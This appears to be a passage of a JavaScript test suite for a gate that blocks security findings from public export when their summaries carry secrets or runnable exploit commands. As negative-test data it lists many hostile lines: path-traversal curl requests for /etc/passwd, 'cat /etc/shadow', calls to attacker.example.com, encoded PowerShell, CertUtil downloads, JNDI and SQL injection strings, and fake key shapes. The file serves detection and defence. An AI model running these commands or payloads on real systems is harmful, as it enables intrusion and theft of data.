    const resolved = exportOf(duplicate, { knownRecordIds: new Set(["F-R2-01"]) });
    assert.deepStrictEqual(resolved.errors, []);
    assert.strictEqual(resolved.allowed, true);
  });

  test("a malformed knownRecordIds blocks the export rather than reading as an empty ledger", () => {
    for (const knownRecordIds of ["F-R2-01", [""], [null], {}, new Set([""])]) {
      const result = exportOf(securityFinding(), { knownRecordIds });
      assert.strictEqual(result.allowed, false, `${JSON.stringify(knownRecordIds)} must be refused`);
      assert.match(result.errors.join("\n"), /knownRecordIds must be an array or Set/);
    }
  });

  test("a classified, sanitized critical finding is exportable", () => {
    const result = exportOf(securityFinding());
    assert.deepStrictEqual(result.errors, []);
    assert.deepStrictEqual(result.blockedReasons, []);
    assert.strictEqual(result.allowed, true);
    assert.strictEqual(result.decision, "export-allowed");
  });

  for (const severity of DISCLOSURE_REQUIRED_SEVERITIES) {
    test(`a ${severity} finding with no disclosure record cannot be exported`, () => {
      const result = exportOf(securityFinding({ severity, disclosure: undefined }));
      assert.strictEqual(result.allowed, false);
      assert.strictEqual(result.decision, "invalid");
      assert.match(result.errors.join("\n"), /needs a recorded disclosure decision/);
    });
  }

  test("an unreadable severity is treated as disclosure-sensitive, never as low", () => {
    for (const severity of [undefined, "", "spicy", 4, {}]) {
      const result = exportOf(securityFinding({ severity, disclosure: undefined }));
      assert.strictEqual(result.allowed, false, `severity ${JSON.stringify(severity)} must block`);
      assert.match(result.errors.join("\n"), /is treated as disclosure-sensitive, never as low/);
    }
  });

  test("an unrecognized classification is not a decision to publish", () => {
    const result = exportOf(securityFinding({
      disclosure: { classification: "maybe", decidedBy: "lkikov", date: "2026-08-22" },
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.errors.join("\n"), /must be one of public\/private\/embargoed/);
  });

  test("an incomplete disclosure record blocks the export", () => {
    for (const field of ["classification", "decidedBy", "date"]) {
      const disclosure = { classification: "public", decidedBy: "lkikov", date: "2026-08-22" };
      delete disclosure[field];
      const result = exportOf(securityFinding({ disclosure }));
      assert.strictEqual(result.allowed, false, `missing ${field} must block`);
      assert.match(result.errors.join("\n"), new RegExp(`disclosure is missing required field: ${field}`));
    }
  });

  test("a disclosure decided by nobody, or on no real day, blocks the export", () => {
    const bad = [
      { classification: "public", decidedBy: "TBD", date: "2026-08-22" },
      { classification: "public", decidedBy: "lkikov", date: "2026-02-31" },
      { classification: "public", decidedBy: "lkikov", date: "soon" },
    ];
    for (const disclosure of bad) {
      assert.strictEqual(exportOf(securityFinding({ disclosure })).allowed, false,
        `${JSON.stringify(disclosure)} must block`);
    }
  });

  for (const classification of DISCLOSURE_CLASSIFICATIONS.filter((c) => c !== "public")) {
    test(`a "${classification}" finding is blocked as policy, not reported as a malformed record`, () => {
      const result = exportOf(securityFinding({
        disclosure: { classification, decidedBy: "lkikov", date: "2026-08-22" },
      }));
      assert.strictEqual(result.allowed, false);
      assert.strictEqual(result.decision, "export-blocked");
      assert.deepStrictEqual(result.errors, []);
      assert.match(result.blockedReasons.join("\n"), /private disclosure path/);
    });
  }

  test("a low-severity finding needs no disclosure record", () => {
    const result = exportOf(securityFinding({ severity: "low", disclosure: undefined }));
    assert.strictEqual(result.allowed, true);
  });

  test("cleared for publication but carrying no summary is blocked, not exported raw", () => {
    for (const publicSummary of [undefined, "", "   ", {}]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(publicSummary)} must block`);
      assert.match(result.blockedReasons.join("\n"), /must not export the raw finding by default/);
    }
  });

  test("every secret shape blocks the export", () => {
    const leaks = {
      "Anthropic/OpenAI-style API key": "the call used sk-ant-api03-QQwerty12345678abcdefg",
      "AWS access key id": "the request was signed with AKIA1234567890ABCDEF",
      "GitHub token": "the job authenticated with ghp_abcdefghijklmnopqrstuvwxyz0123456789",
      "bearer token": "the header sent was Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload",
      "JWT": "the session eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.dBjftJeZ4CVP was accepted after logout",
      "PEM private key": "the log printed -----BEGIN RSA PRIVATE KEY----- and the body after it",
      "credentials inside a connection URL": "the DSN was postgres://aperio:hunter2@db.internal/aperio",
    };
    for (const [name, publicSummary] of Object.entries(leaks)) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${name} must block`);
      assert.match(result.blockedReasons.join("\n"), new RegExp(name.replace(/[/]/g, "\\/")));
    }
    assert.strictEqual(SECRET_PATTERNS.length, Object.keys(leaks).length,
      "every declared secret pattern needs a negative test");
  });

  test("an assigned secret value blocks the export", () => {
    const result = exportOf(securityFinding({
      publicSummary: "The config was loaded with password=hunter2swordfish and the check passed.",
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /never the credential/);
  });

  test("but a visibly redacted value is a description, not a leak", () => {
    for (const value of ["<redacted>", "***", "[MASKED]", "xxxxxxxx"]) {
      const result = exportOf(securityFinding({
        publicSummary: `The config was loaded with password=${value} and the check still passed.`,
      }));
      assert.strictEqual(result.allowed, true, `${value} should read as redacted`);
    }
  });

  test("a runnable command copied out of the reproduction blocks the export", () => {
    const result = exportOf(securityFinding({
      publicSummary: "Reproduce with curl http://localhost:3000/api/files?path=../../etc/passwd and the " +
        "file comes back.",
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /reproduces a runnable command from reproduction verbatim/);
  });

  test("a prompt-prefixed command copied out of the reproduction blocks the export", () => {
    // The bypass this replaces: RUNNABLE_COMMAND is anchored, so a reproduction
    // written the way terminals and markdown write one — `$ curl ...`, a
    // bullet, a backtick fence — read as "not a command" and the identical
    // exploit-ready line published.
    // A blockquote prompt (`> curl ...`) is listed with a second acceptable
    // reason because `>` is ALSO a shell redirection, so that one line trips the
    // chaining shape before the command rule ever reads it. Both answers block
    // the export; pinning only one of them would assert which rule fires first.
    const decorated = [
      { line: "$ curl -X POST https://host/vulnerable", reason: /reproduces a runnable command/ },
      { line: "user@host:~$ curl -X POST https://host/vulnerable", reason: /reproduces a runnable command/ },
      { line: "- `curl -X POST https://host/vulnerable`", reason: /reproduces a runnable command/ },
      // An ORDERED step, which is how every multi-command reproduction is written.
      { line: "1. curl -X POST https://host/vulnerable", reason: /reproduces a runnable command/ },
      { line: "2) curl -X POST https://host/vulnerable", reason: /reproduces a runnable command/ },
      { line: "> curl -X POST https://host/vulnerable", reason: /reproduces a runnable command|shell command chaining/ },
    ];
    for (const { line, reason } of decorated) {
      const result = exportOf(securityFinding({
        reproduction: line,
        publicSummary: `Anyone can trigger it: ${line}`,
      }));
      assert.strictEqual(result.allowed, false, `must block: ${line}`);
      assert.match(result.blockedReasons.join("\n"), reason, `wrong reason for: ${line}`);
    }
  });

  test("a capitalized POSIX runner needs real shell syntax before it counts", () => {
    // RUNNABLE_COMMAND folds case for the Windows names only; this scanner has to
    // agree, and it cannot do it on case alone. Both sentences below open with a
    // capitalized POSIX runner — one is a recommendation, the other is a working
    // request — so the ARGUMENT is what separates them.
    const honest = [
      "Make /api reject unauthenticated requests before the fix ships.",
      "Node 20.11 clients see the same error, which is how it was found.",
      "Curl users report a 500 from the health endpoint once the cache is cold.",
      "Python callers keep the stale session until the worker restarts.",
    ];
    for (const publicSummary of honest) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }

    // A capital costs a runner its weaker tiers and nothing else.
    for (const publicSummary of [
      "Curl http://host/admin returns the file to any caller.",
      "Curl -X POST https://host/promote escalates the caller.",
      "Node exploit.js?role=admin runs with the service account.",
      // Lowercase keeps every tier it had, including the bare-path one.
      "Anyone can run curl /api and read the whole tree.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/);
    }
  });

  test("a command that takes no argument is whole the moment it is named", () => {
    // Every other tier waits for an operand, so `tcpdump` on its own — which
    // starts capturing every packet on the wire — was read as a word.
    for (const line of ["reboot", "shutdown", "halt", "tcpdump", "poweroff", "mongosh", "redis-cli"]) {
      const result = exportOf(securityFinding({
        publicSummary: `Any agent on the box can run ${line} and nothing stops it.`,
      }));
      assert.strictEqual(result.allowed, false, `must block: ${line}`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/, `wrong reason for: ${line}`);
    }
  });

  test("but naming a reboot or a capture is ordinary writing", () => {
    // The two tiers are guarded differently on purpose. `tcpdump` is never a
    // word, so a determiner is enough to mark the noun form. `reboot` IS a word,
    // and "Reboot loops are common" opens a sentence exactly the way a command
    // would — so those need a run verb in front before they count at all.
    const honest = [
      "The reboot clears the cache, which is the whole defect.",
      "Reboot loops are common on the affected nodes once the disk fills.",
      "A shutdown of the worker leaves the lock file behind.",
      "Halt semantics differ between the two backends, which is the defect.",
      "A tcpdump capture taken during the incident shows the plaintext.",
      "The mongosh session inherits the operator's own credentials.",
    ];
    for (const publicSummary of honest) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }
  });

  test("a never-prose executable and one plain word is already the whole command", () => {
    // `rm uploads` and `sudo reboot` carry no flag, no path, and no number, so
    // every shape tier waited for punctuation that never arrives — and these are
    // the most destructive two-word forms in the runner list.
    for (const line of ["rm uploads", "sudo reboot", "pkill aperio", "killall llama-server",
      "shred credentials", "systemctl stop", "mv secrets.bak"]) {
      const result = exportOf(securityFinding({
        publicSummary: `Anyone on the box can run ${line} and the damage is done.`,
      }));
      assert.strictEqual(result.allowed, false, `must block: ${line}`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/, `wrong reason for: ${line}`);
    }
  });

  test("but NAMING one of those tools is ordinary writing", () => {
    // The two guards this pins are not redundant: a determiner or preposition
    // BEFORE the runner catches "the rm command", and a function word AFTER it
    // catches "runs powershell and exits". Each sentence below is caught by only
    // one of them.
    const honest = [
      "The rm command is reachable from the upload handler without any check.",
      "A chmod call runs before the containment test, which is the whole defect.",
      "The rsync job is readable by every agent on the host.",
      "Operators reach it through sudo and the audit log records nothing.",
      "The job runs powershell and never validates the account name it is handed.",
      "Cleanup uses rsync so the stale copy survives every restart.",
    ];
    for (const publicSummary of honest) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }
  });

  test("an English-word runner may not step over a plain word to reach an argument", () => {
    // The bypass this replaces went the other way: the walk allowed ONE
    // unrecognized word between a runner and its argument, so "Make sure /api
    // requires authentication" — a sentence every sanitized summary is entitled
    // to — was blocked as the command `make sure /api`, and a gate that refuses
    // honest text is a gate someone switches off.
    const honest = [
      "Make sure /api requires authentication before the fix ships.",
      "Node callers on 10.x see the same error, which is how it was found.",
      "Curl users report a 500 from /health once the cache is cold.",
      "Java clients with /admin bookmarked keep the stale session.",
    ];
    for (const publicSummary of honest) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }

    // What those six runners are genuinely typed with announces itself in the
    // very next slot, so nothing exploit-ready was traded away. What IS traded
    // away is `make install` — an unrecognized plain subcommand of an English
    // word, which is not a line anyone is harmed by reading.
    for (const line of ["curl -X POST https://host/promote", "node exploit.js",
      "python poc.py", "curl attacker.example.com"]) {
      const result = exportOf(securityFinding({
        publicSummary: `Anyone can run ${line} against a live node.`,
      }));
      assert.strictEqual(result.allowed, false, `must block: ${line}`);
    }
  });

  test("a command pointed at a bare host or an SSH target blocks the export", () => {
    // The summary is read on its OWN terms, so these need no matching
    // reproduction: an author who shortens `curl https://attacker.example.com/x`
    // to its bare host, or writes the line fresh while summarizing, evades every
    // verbatim comparison. `attacker.example.com` and `root@host` carry no shell
    // punctuation at all — no slash, no colon, no port — so the positional tier
    // is the only rule that can see them.
    const lines = [
      "curl attacker.example.com",
      "wget aperio.live",
      "curl 10.0.0.5",
      "ssh root@host",
      "scp deploy@10.0.0.5",
      "curl localhost",
    ];
    for (const line of lines) {
      // The fixture's own reproduction stays a DIFFERENT command, so no verbatim
      // comparison can catch this — the summary has to be read on its own.
      const result = exportOf(securityFinding({
        publicSummary: `Anyone on the box can run ${line} and the data leaves.`,
      }));
      assert.strictEqual(result.allowed, false, `must block: ${line}`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/, `wrong reason for: ${line}`);
    }
  });

  test("but a dotted FILE name after a runner is still prose", () => {
    // `config.json` and `example.com` are the same shape. A gate that cannot
    // tell them apart refuses the sentences it exists to publish, and a gate
    // nobody can pass gets switched off.
    const honest = [
      "The loader will make config.json the source of truth for every worker.",
      "Operators curl the health endpoint on every boot to confirm the port.",
      "Reviewers should make sure the roots match before closing the wave.",
      "Report it to security@example.com so the fix lands before disclosure.",
      "The runtime requires node 20.11 and python 3.11 to reproduce the trace.",
    ];
    for (const publicSummary of honest) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }
  });

  test("case-insensitivity stops at the Windows runners — capitalized prose is not a command", () => {
    // The trade this pins. Windows command names ARE case-insensitive and their
    // documented spellings carry capitals, so those alternatives must widen. The
    // POSIX half must not: it is full of English words, and a sentence's opening
    // capital is exactly what a blanket `i` flag would read as a command — so
    // `Make sure the invariant is checked`, written in any required field, would
    // stand in for a reproduction nobody can re-run.
    for (const windows of ["PowerShell -EncodedCommand AAA", "CMD /c whoami",
      "CertUtil -urlcache -f http://host/p.exe", "RUNDLL32 shell32,Control_RunDLL"]) {
      assert.strictEqual(RUNNABLE_COMMAND.test(windows), true, `must read as runnable: ${windows}`);
    }
    for (const prose of ["Make sure the invariant is checked", "Node providers can retry",
      "Java callers see the same error", "Python clients reconnect on their own"]) {
      assert.strictEqual(RUNNABLE_COMMAND.test(prose), false, `must read as prose: ${prose}`);
    }
    // The lowercase POSIX forms still are commands — nothing was narrowed there.
    assert.strictEqual(RUNNABLE_COMMAND.test("curl http://host/x"), true);
    assert.strictEqual(RUNNABLE_COMMAND.test("node exploit.js"), true);
  });

  test("a Windows runner spelled the way Windows spells it is still a command", () => {
    // Windows command names are case-insensitive, and the documented spellings
    // carry capitals: `PowerShell -EncodedCommand ...` is the form the payload
    // is pasted in. A case-sensitive runner match reads every line below as
    // prose — so T6 would refuse a real reproduction, and this gate would hand
    // the same payload to a public issue.
    const windows = [
      "PowerShell -EncodedCommand SQBFAFgAIAAoAA==",
      "CMD /c type C:/aperio/.env",
      "CertUtil -urlcache -f https://host/p.exe p.exe",
      "Rundll32 javascript:\\..\\mshtml,RunHTMLApplication",
    ];
    for (const line of windows) {
      assert.strictEqual(RUNNABLE_COMMAND.test(line), true, `must read as runnable: ${line}`);
      const result = exportOf(securityFinding({
        reproduction: line,
        publicSummary: `Anyone can trigger it: ${line}`,
      }));
      assert.strictEqual(result.allowed, false, `must block: ${line}`);
      assert.match(result.blockedReasons.join("\n"), /reproduces a runnable command|shell command chaining/,
        `wrong reason for: ${line}`);
    }
  });

  test("a script invoked through its path is a command, whatever it is called", () => {
    // The hole this closes: both gates matched the BASENAME against the runner
    // allowlist, and no allowlist will ever contain the attacker's own filename.
    // So `./exploit.sh --target victim` was not re-runnable evidence to T6 and
    // not a command to T8.2 — the same line, refused as a reproduction and
    // allowed into a public issue.
    for (const line of ["./exploit.sh --target victim", "/tmp/poc.exe", "~/poc.py --target victim",
      "/opt/tools/dump.py http://host/admin"]) {
      assert.strictEqual(RUNNABLE_COMMAND.test(line), true, `must read as runnable: ${line}`);
      const result = exportOf(securityFinding({ publicSummary: `Anyone can run ${line} and it works.` }));
      assert.strictEqual(result.allowed, false, `must block: ${line}`);
    }

    // A SOURCE file named through its path is how a summary says where the
    // defect lives, so it counts only while it carries real shell syntax.
    for (const publicSummary of [
      "The check lives in ./lib/routes/paths.js and it accepts a parent segment.",
      "The fix lands in ./scripts/gen-env-example.js next week.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }
  });

  test("a bare `whoami` is a command in both gates — it needs no argument", () => {
    // The hole this closes: `whoami` was in no vocabulary at all. It is not a
    // runner (it takes no operand), it never satisfied RUNNABLE_COMMAND, and the
    // payload patterns saw it only after a `;` or a `|` — so a summary or a
    // reproduction carrying a bare `whoami` walked straight through.
    assert.strictEqual(RUNNABLE_COMMAND.test("whoami"), true);
    for (const publicSummary of [
      "Anyone can run whoami through the unauthenticated shell tool.",
      "An anonymous caller can execute uname on the host.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
    }

    // And the noun forms still publish, from either side: a determiner in front
    // or a category noun behind is a tool being NAMED.
    for (const publicSummary of [
      "A whoami banner is printed on login, which is not the finding.",
      "The endpoint returns whoami output to any caller, which is the finding.",
      "The tcpdump capture is attached to the private issue.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }
  });

  test("the walk does not cross a full stop — two sentences are not one command", () => {
    // The false positive this closes: the summary is split on whitespace, which
    // knows nothing about sentences. A lowercase runner ending one sentence and
    // a path starting the next were read as the command `node /api`, and an
    // honest summary became unpublishable.
    for (const publicSummary of [
      "The helper is implemented in node. /api rejects anonymous users.",
      "The reader is written in python. /admin is unaffected by the change.",
      "Callers reach it over ssh; /health stays open to everyone.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }

    // A real argument routinely ends a sentence, and that is still a command.
    for (const publicSummary of [
      "Any caller can reach curl http://localhost:3000/api/files.",
      "Anyone can run rm -rf /var/aperio. The data is gone.",
    ]) {
      assert.strictEqual(exportOf(securityFinding({ publicSummary })).allowed, false,
        `must block: ${publicSummary}`);
    }
  });

  test("a copy is exfiltration too — `cp /etc/passwd /tmp/leak` does not publish", () => {
    // The hole this closes: `rm` and `mv` were in the vocabulary and `cp` was
    // not, so the quieter half of the same act — take the file somewhere
    // readable and leave the original alone — was invisible to both gates.
    for (const line of ["cp /etc/passwd /tmp/leak", "cp -r /var/aperio /tmp/dump"]) {
      assert.strictEqual(RUNNABLE_COMMAND.test(line), true, `must read as runnable: ${line}`);
      // Pasted whole out of the reproduction.
      assert.strictEqual(exportOf(securityFinding({
        reproduction: line, publicSummary: `Anyone can trigger it: ${line}`,
      })).allowed, false, `must block when pasted: ${line}`);
      // And carried by the summary on its own terms.
      assert.strictEqual(exportOf(securityFinding({
        publicSummary: `Anyone can run ${line} through the shell tool.`,
      })).allowed, false, `must block on its own terms: ${line}`);
    }
  });

  test("a file-read command is a command — `cat /etc/passwd` does not publish", () => {
    // The hole this closes: `cat` was recognized only AFTER a `;` or a `|`, by
    // the chaining rules. On its own it was not in the runner vocabulary at all,
    // so the plainest exfiltration line there is — "Run cat /etc/passwd to
    // retrieve the file" — exported as a sanitized summary.
    const reads = [
      "Run cat /etc/passwd to retrieve the file.",
      "cat /etc/shadow returns every password hash to an unauthenticated caller.",
      "awk -F: '{print $1}' /etc/passwd dumps every account name.",
      "tar -czf /tmp/out.tgz /var/aperio ships the whole data directory.",
    ];
    for (const publicSummary of reads) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"),
        /carries a runnable command|shell command chaining/, `wrong reason for: ${publicSummary}`);
    }

    // And the English senses of the same words still publish: `cat` and `tar`
    // are ordinary nouns, so they join the runners that get no hop over a plain
    // word on the way to an argument.
    for (const publicSummary of [
      "A cat picture in the upload folder is not the problem.",
      "The importer runs tar archives through a helper before writing them out.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }
  });

  test("`run ssh victim` is a command — a single-label host is still a host", () => {
    // The bypass this closes: `ssh` is not in the never-prose set, because "the
    // SSH key" and "SSH clients" are how the protocol is written about — so its
    // whole and plainest form carried nothing to catch. `victim` has no dot for
    // BARE_HOST, no `:port`, no `@user`, and no flag, so every shape test said
    // prose and a working intrusion published.
    const commands = [
      "Anyone can run ssh victim and land a shell.",
      "An unauthenticated caller can execute ssh buildbox with the leaked key.",
      "The runbook says to type ftp archive to pull the dump.",
    ];
    for (const publicSummary of commands) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), /carries a runnable command/,
        `wrong reason for: ${publicSummary}`);
    }

    // The run verb is what supplies the evidence, so the protocol keeps its
    // ordinary sense in every sentence that does not claim a line was typed.
    for (const publicSummary of [
      "SSH clients reconnect on their own after the restart.",
      "The worker runs ssh sessions through a pooled connection.",
      "Access is over SSH and the key never leaves the host.",
      "An ssh key checked into the repository is the finding.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }
  });

  test("a tool INTRODUCED by a verb and a category noun is a mention, not a command", () => {
    // The false positive this closes: the two-word rule reads any plain word
    // after a never-prose executable as its operand, so three ordinary sanitized
    // sentences were refused — and a gate that blocks honest summaries is a gate
    // that gets switched off.
    const mentions = [
      "The worker runs PowerShell scripts to provision accounts.",
      "The scheduler invokes kubectl clients on every deploy.",
      "The cleanup job uses rm operations that are never path-checked.",
      "The installer executes chmod commands the reviewer never sees.",
    ];
    for (const publicSummary of mentions) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }

    // Both halves are required. The verb alone does not make a mention — someone
    // saying "run rm uploads" is handing over the line, not describing it — and
    // neither does the noun alone.
    for (const publicSummary of [
      "Run rm uploads to clear the evidence.",
      "The endpoint lets an anonymous caller rm uploads.",
    ]) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `must block: ${publicSummary}`);
    }
  });

  test("an executable named by its path is still a command, in both gates", () => {
    // The bypass this closes: the runner match wanted a bare name, so the most
    // explicit spelling of a command there is — `/bin/sh -c whoami` — read as
    // prose. leakedSourceText skipped the verbatim line, leakedCommands did not
    // recognize `/bin/sh`, and a confirmed critical finding exported with the
    // working reproduction in its public summary.
    const paths = [
      "/bin/sh -c whoami",
      "/usr/bin/curl -X POST https://host/promote",
      "../tools/nc host 4444",
      "~/bin/kubectl -n prod exec pod -- sh",
      "C:/Windows/System32/cmd.exe /c type C:/aperio/.env",
    ];
    for (const line of paths) {
      assert.strictEqual(RUNNABLE_COMMAND.test(line), true, `must read as runnable: ${line}`);
      // Pasted whole out of the reproduction.
      const pasted = exportOf(securityFinding({
        reproduction: line,
        publicSummary: `Anyone can trigger it: ${line}`,
      }));
      assert.strictEqual(pasted.allowed, false, `must block: ${line}`);
      // And carried by the summary alone, with the finding's own reproduction
      // saying something else entirely — the leakedCommands half.
      const alone = exportOf(securityFinding({ publicSummary: `Anyone can trigger it: ${line}` }));
      assert.strictEqual(alone.allowed, false, `must block on its own terms: ${line}`);
    }

    // A `.exe` suffix is decoration on the same name, not a different tool.
    assert.strictEqual(
      exportOf(securityFinding({ publicSummary: "powershell.exe -EncodedCommand AAA drops the file." })).allowed,
      false);
  });

  test("but a path in a sentence is not a command — the prefix has to look like a path", () => {
    // The cost of the rule above is prose that mentions a file. A relative-looking
    // prefix (`audit/scripts/git`) is exactly what would swallow honest writing,
    // so only `/`, `./`, `../`, `~/`, and a drive letter open the path form.
    const honest = [
      "The helper lives in audit/scripts/git hooks and needs no change.",
      "Every read goes through lib/routes/paths.js before it reaches the disk.",
      "The gate accepts a summary and/or make notes for the reviewer.",
      "The /bin directory is mounted read-only in the container.",
    ];
    for (const publicSummary of honest) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, true,
        `must publish: ${publicSummary}\n${result.blockedReasons.join("\n")}`);
    }
  });

  test("a prompt in the reproduction and a bare command in the summary are the same line", () => {
    // The decoration is what differs, so comparing the raw lines would call
    // these two texts unrelated and let the command out.
    const result = exportOf(securityFinding({
      reproduction: "$ curl -X POST https://host/vulnerable",
      publicSummary: "Anyone can trigger it with curl -X POST https://host/vulnerable against the host.",
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /reproduces a runnable command from reproduction verbatim/);
  });

  test("an exploitPayload copied into the summary blocks the export", () => {
    const result = exportOf(securityFinding({
      exploitPayload: "sh -c 'cat /etc/shadow'",
      publicSummary: "The tool argument is passed to a shell, so sh -c 'cat /etc/shadow' runs as the server user.",
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /exploitPayload/);
  });

  test(`a ${SHARED_PHRASE_WORDS}-word verbatim run out of the evidence blocks the export`, () => {
    const result = exportOf(securityFinding({
      publicSummary: "A path-check flaw: send the crafted path lib/../../etc/passwd through the read " +
        "endpoint and files outside the root come back.",
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /shares a 8-word verbatim run with evidence/);
  });

  test("a short shared phrase is not a paste and does not block", () => {
    const result = exportOf(securityFinding({
      publicSummary: "A crafted path can escape the allowed root. The reproduction is withheld.",
    }));
    assert.strictEqual(result.allowed, true);
  });

  test("a sensitive field the scanner cannot read blocks the export, it does not scan as empty", () => {
    // `reproduction` and `evidence` are CONFIRMATION_STRING_FIELDS, so an
    // unreadable one is refused by the record gate before the scanner is
    // reached — a stricter failure for the same reason, and reported through
    // `errors` because the record really is malformed.
    for (const overrides of [
      { evidence: {} },
      { evidence: 42 },
      { evidence: [null] },
      { evidence: [{ kind: "reproduction", detail: { steps: ["curl ..."] } }] },
      { reproduction: { command: "curl http://localhost:3000/api/files?path=../../etc/passwd" } },
    ]) {
      const result = exportOf(securityFinding(overrides));
      assert.strictEqual(result.allowed, false, `${JSON.stringify(overrides)} must block`);
      assert.strictEqual(result.decision, "invalid");
      assert.match(result.errors.join("\n"), /must be a non-empty string/);
    }

    // `exploitPayload` is optional and has no required shape, so it is the
    // scanner's to refuse: a field it cannot read is not a field that held
    // nothing.
    const payload = exportOf(securityFinding({ exploitPayload: ["sh -c 'cat /etc/shadow'"] }));
    assert.strictEqual(payload.allowed, false);
    assert.match(payload.blockedReasons.join("\n"), /a field the scanner cannot read/);
  });

  test("an absent OPTIONAL sensitive field is a real answer and does not block", () => {
    // exploitPayload is the only one of the three that may be absent: schema.js
    // makes `reproduction` and `evidence` mandatory on any valid finding, and
    // the export gate now validates the record, so dropping those is a
    // malformed record rather than a scanner question.
    const result = exportOf(securityFinding({ exploitPayload: undefined }));
    assert.strictEqual(result.allowed, true);

    for (const field of ["reproduction", "evidence"]) {
      const stripped = exportOf(securityFinding({ [field]: undefined }));
      assert.strictEqual(stripped.allowed, false, `a finding with no ${field} must not export`);
      assert.match(stripped.errors.join("\n"), new RegExp(`missing required field: ${field}`));
    }
  });

  test("the scan is deterministic — the stateful /g pattern must not skip a leak on a second call", () => {
    const finding = securityFinding({
      publicSummary: "Two leaks: password=hunter2swordfish and api_key=abcdef1234567890.",
    });
    const first = exportOf(finding);
    const second = exportOf(finding);
    assert.deepStrictEqual(second, first);
    assert.strictEqual(first.blockedReasons.length, 2);
  });

  test("an unreadable finding is invalid, never allowed", () => {
    for (const bad of [null, undefined, [], "A05-F1"]) {
      const result = exportOf(bad);
      assert.strictEqual(result.allowed, false);
      assert.strictEqual(result.decision, "invalid");
    }
  });

  // ── review round 1 ────────────────────────────────────────────────────
  // Five ways an export slipped through the gate. Each of the following is the
  // negative test that was missing when the bypass existed.

  test("the canonical string `evidence` shape is scannable — a confirmed finding must be exportable", () => {
    // The shape slice-execution.js's CONFIRMATION_STRING_FIELDS requires. When
    // the scanner accepted only arrays, EVERY genuinely confirmed finding was
    // reported unscannable and could never be exported at all.
    const result = exportOf(securityFinding());
    assert.strictEqual(result.allowed, true);
    assert.deepStrictEqual(result.blockedReasons, []);
  });

  test("a string `evidence` is still compared against the summary, not waved through", () => {
    const result = exportOf(securityFinding({
      publicSummary: "A path-check flaw: send the crafted path lib/../../etc/passwd through the read " +
        "endpoint and files outside the root come back.",
    }));
    assert.strictEqual(result.allowed, false);
    assert.match(result.blockedReasons.join("\n"), /verbatim run with evidence/);
  });

  test("short exploit payloads under both length floors still block the export", () => {
    // None of these is a runnable command, and none reaches eight words, so
    // neither source-comparison rule sees them.
    const payloads = {
      "path traversal sequence": "A request for ../../etc/passwd is served from outside the root.",
      "percent-encoded traversal or null byte": "Sending %2e%2e%2f in the path defeats the check.",
      "SQL tautology or comment terminator": "Supplying ' OR 1=1 -- as the name returns every row.",
      "script injection": "Posting <script>alert(1)</script> stores it unescaped in the page.",
      "shell command chaining": "A name of `; cat /etc/shadow` is passed straight to the shell.",
      "template or JNDI injection": "A header of ${jndi:ldap://x/a} is resolved during logging.",
    };
    for (const [name, publicSummary] of Object.entries(payloads)) {
      const result = exportOf(securityFinding({ publicSummary }));
      assert.strictEqual(result.allowed, false, `${name} must block: ${publicSummary}`);
      assert.match(result.blockedReasons.join("\n"), new RegExp(name));
    }
